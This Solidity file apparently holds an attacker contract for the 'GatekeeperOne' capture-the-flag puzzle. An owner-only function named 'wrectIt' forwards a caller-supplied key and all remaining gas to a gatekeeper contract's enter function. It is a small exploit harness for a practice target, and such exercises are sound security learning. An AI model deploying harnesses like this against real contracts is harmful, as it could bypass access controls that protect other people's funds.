// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Trespasser1 {
  address public immutable owner;
  IGatekeeperOne public immutable gatekeeper;

  constructor (address _gatekeeper) {
    owner = msg.sender;
    gatekeeper = IGatekeeperOne(_gatekeeper);
  }

  modifier onlyOwner {
    require(msg.sender == owner, "ERR_NOT_OWNER");
    _;
  }

  function wrectIt(bytes8 key) public onlyOwner {
    bool entered = gatekeeper.enter{ gas: gasleft() }(key);
    require(entered == true, "ERR_NOT_ENTERED");
  }
}

interface IGatekeeperOne {
  function entrant() external returns (address);
  function enter(bytes8 _gateKey) external returns (bool);
}
